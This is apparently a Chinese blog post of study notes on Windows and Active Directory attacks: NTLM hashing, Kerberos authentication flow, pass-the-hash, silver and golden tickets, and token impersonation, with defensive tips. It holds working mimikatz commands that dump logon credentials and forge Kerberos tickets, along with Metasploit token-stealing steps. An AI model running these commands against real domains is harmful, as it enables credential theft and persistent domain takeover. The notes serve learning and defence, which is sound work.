---
title: Kerberos
date: 2022-03-02 17:24:38
tags:
      - Windows
      - 内网渗透
categories:
description:
keywords:
---

# Kerberos

### 本地认证

sam(记录用户的密码)文件位置:%SystemRoot%\system32\config\sam

使用NTLM hash加密sam文件的密码 32位 数字和字母构成



使用python来生成NTLM hash

```python
from passlib.hash import nthash
code = nthash.hash("123456")
print(code)
>>32ed87bdb5fdc5e9cba88547376818d4
```

转换原理是先对明文进行16进制编码再转换为Unicode编码再进行md4编码



#### Windows登录流程

winlogon.exe适用于管理用户登录和退出的,lsass.exe是微软的安全机制,它用于本地安全和登录策略

winlogon输入用户名和密码后交给lsass.exe,然后将密码计算出来密文然后去sam比对



### 网络认证

1.协商

客户端首先确认服务端的NTLM版本

2.质询

客户端向服务器发送一个用户信息(用户名)

服务端接收后生成一个16进制的challenge然后使用用户名对应的NTLM hash来加密challenge生成challenge1,之后将challenge发送给客户端

客户端接收后,客户端使用密码计算出自己的NTLM hash来加密challenge2并发送给服务端

3.验证

服务端认证challenge1和challenge2



![image-20220302192324392](..\..\public\img\kerberos-1.png)

### 哈希传递

不需要用户名和密码的情况下登录

条件:

需要用户名

需要用户名对应的NTLM hash



使用工具

smbmap

crackMapExec

Smbexec

Metasploit



### AD

服务器以及客户机的计算机管理

管理域账号

资源管理

桌面配置

应用系统支持



### 域认证(Kerberos)

有三个角色参与Client、Server、KDC（域控上面的服务，kerberos）



![image-20220302194123945](..\..\public\img\kerberos-2.png)

客户端如果想要获取服务器的权限首先要跟KDC（Kerberos）获取票据





**AS服务器的交互**

![image-20220302194516022](..\..\public\img\kerberos-3.png)

1.的数据包含：

- client hash加密timestamp，用户KDC身份认证
- Client info(域名\\域账户) 用于KDC查找Client的hash
- server info （TGS）

2.的数据包含

- Client pass
  - 用Client hash加密Session Key
- KDC pass
  - KDC hash 加密TGT
  - Session Key
  - Client info(域名\\域账户)
  - End Time 票据的有效期

**TGS服务器的交互**

![image-20220302200331534](..\..\public\img\kerberos-4.png)



1.数据包含

- 用上一步的Session Key加密client info和时间戳
- client info(域名\\域账户)
- server info

2.数据包含

- session key加密server session key
- server hash（Ticket）



**与server端交互**

![image-20220302200947446](..\..\public\img\kerberos-5.png)



认证的流量抓包

![image-20220302201100796](D:\Code\pojo\Blog\BlogHexo\public\img\kerberos-6.png)





### 白银票据

**条件**

- 不需要和KDC交互
- 需要目标的NTLM hash

**防御**

需要开启PAC

一般的ticket构造为:

![image-20220302201210582](D:\Code\pojo\Blog\BlogHexo\public\img\kerberos-7.png)

可以使用mimikatz来伪造白银票据



kerberos::list ==列出票据==

kerberos::purge ==清除票据==

mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit">log.txt  ==导出票据==

mimikatz.exe "kerberos::golden /domain:域名 /sid:域sid /target:目标服务器的主机名 /service:服务类型 /rc4:NTLM hash /user:用户名 /ptt" exit ==生成票据到内存(用户名可以随便写因为他不会去验证)==



服务类型看这里

![image-20220302203025623](D:\Code\pojo\Blog\BlogHexo\public\img\kerberos-8.png)



防御:

1.尽量保证服务器凭证不被窃取

2.开启PAC(每次提交票据都需要验证)

开启PAC方法HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa\Kerberos\Parametes中的ValidateKdcPacSignature设置为1



### 黄金票据

**条件**

- 需要DC通信
- 需要krbtgt用户的hash(就是KDC hash)

**特点**

能够持久性的隐藏,日志无法溯源,拿到DC权限后能够长时间控制域



**防御:**

需要经常换密码.最根本的方法是不允许域管理账号登录到其他的服务器



**使用msf的kiwi模块**

session -i 1

load kimi              (加载进来以后可以使用帮助命令查看有哪些功能)

kerberos_ticket_list

![image-20220302204643664](D:\Code\pojo\Blog\BlogHexo\public\img\kerberos-9.png)



mimikatz.exe "kerberos::golden /domain:域名 /sid:域sid /target:目标服务器的主机名 /service:服务类型 /rc4:\<KRBTGT NTLM hash\> /user:用户名 /ptt" exit ==生成票据到内存(用户名可以随便写因为他不会去验证)==



### Windows access token

每一个进程创建的时候会根据用户权限生成一个access token

access token分为两种一个是主令牌,一个是从令牌

当用户注销的时候会将主令牌切换到从令牌,但是不会清除令牌只有重启的时候才会清除

令牌格式如下:

![image-20220302210310664](D:\Code\pojo\Blog\BlogHexo\public\img\kerberos-10.png)



**使用工具如下:**

MSF - incognit

>使用方法:
>
>getsystem
>
>load incognit
>
>list_tokens -u
>
>impersonate_token "token名称"

Cobalt Strike - steal_token

PowerShell - invoke-TokenManipulation.ps1



**防御:**

禁止Domain Admins 登录对外并且未进行安全加固的服务器 

>通过下面的视频来学习结果
>
>https://www.bilibili.com/video/BV1S4411q7Cw?from=search&seid=12934597128076560758&spm_id_from=333.337.0.0
